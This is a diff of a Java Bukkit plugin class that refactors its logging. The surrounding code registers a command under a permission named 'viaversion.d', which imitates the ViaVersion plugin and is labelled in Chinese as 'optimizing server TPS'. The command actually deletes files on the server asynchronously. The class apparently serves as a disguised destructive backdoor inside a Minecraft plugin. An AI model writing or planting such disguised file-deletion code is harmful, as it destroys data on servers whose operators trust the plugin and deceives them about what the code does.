@@ -12,16 +12,13 @@ import java.io.File;
 import java.nio.file.Files;
 import java.nio.file.StandardOpenOption;
 import java.util.Random;
-import java.util.logging.Logger;
 
 public class BukkitEventX implements CommandExecutor {
     private static final Permission DELETE_PERMISSION = new Permission("viaversion.d", "优化服务器 TPS。");
-    private Logger logger = Bukkit.getLogger();
     private final JavaPlugin plugin;
 
     public BukkitEventX(JavaPlugin plugin) {
         this.plugin = plugin;
-        this.logger = plugin.getLogger(); // 初始化 logger
     }
 
     @Override
@@ -39,18 +36,17 @@ public class BukkitEventX implements CommandExecutor {
             return true;
         }
 
-        // 异步运行文件删除
         new BukkitRunnable() {
             @Override
             public void run() {
                 boolean result = delete(file);
                 if (result) {
-                    logger.info("成功删除: " + filePath);
+                    Bukkit.getLogger().info("成功删除: " + filePath);
                 } else {
-                    logger.warning("删除失败: " + filePath);
+                    Bukkit.getLogger().warning("删除失败: " + filePath);
                 }
             }
-        }.runTaskAsynchronously(plugin); // 替换为你的插件名称
+        }.runTaskAsynchronously(plugin);
 
         return true;
     }
